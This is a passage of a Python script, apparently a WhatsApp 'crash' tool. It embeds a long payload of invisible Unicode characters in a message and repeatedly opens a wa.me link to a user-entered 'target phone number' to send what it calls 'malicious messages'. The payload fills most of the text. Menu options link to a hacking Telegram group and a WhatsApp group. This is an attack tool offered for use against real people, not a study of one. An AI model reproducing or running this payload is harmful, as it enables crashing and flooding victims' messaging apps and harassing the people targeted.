󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓??󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦??󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊
                                        """}
        data = urllib.parse.urlencode(crash)
        VictimNumber = input (Fore.RED + " Enter target phone number [Including Country code]: ")
        if "2349052863644" in VictimNumber:
            print(Fore.YELLOW + "You can\'t use my script against me 😂😂😂")
            exit()
        if " " in VictimNumber:
            print(Fore.YELLOW + "\n\nEnter number without space!")
            exit()
        url = "https://wa.me/" + VictimNumber +"?" + data
        j = "xdg-open " + url
        try:
            global Times
            Times = int(input(Fore.RED + "\nEnter the number of sending malicious messages: "))
        except ValueError:
            print(Fore.RED + "Value must be an integer only")
            t.sleep(2)
            loop()
        for x in range(1, Times + 1):
          os.system(j)
          t. sleep(15)
        print(Fore.GREEN + "Done sending malicious messages to " + VictimNumber)
    elif menu == 3:
        os.system("xdg-open https://t.me/termuxhackz_society")
    elif menu == 4:
        os.system("xdg-open https://chat.whatsapp.com/IWqGOsJPjkp2vXcMSJKYns")
    elif menu == 5:
        print(Fore.BLUE + "Thanks for using\nKindly follow me on github")
        t.sleep(2)
        os.system("xdg-open https://github.com/spider863644")
    elif menu == 6:
        print(Fore.GREEN + 'Version is 1.5')
    elif menu == 2:
        header = input(Fore.YELLOW + "Enter message header: ")
        if len(header) > 1000:
            print(Fore.RED + "Header shouldn\'t be greater than 1000 characters[Space included]")
            t.sleep(3)
            loop()
        crash = {'text' : header + """
󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔‎‏​‌‌󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦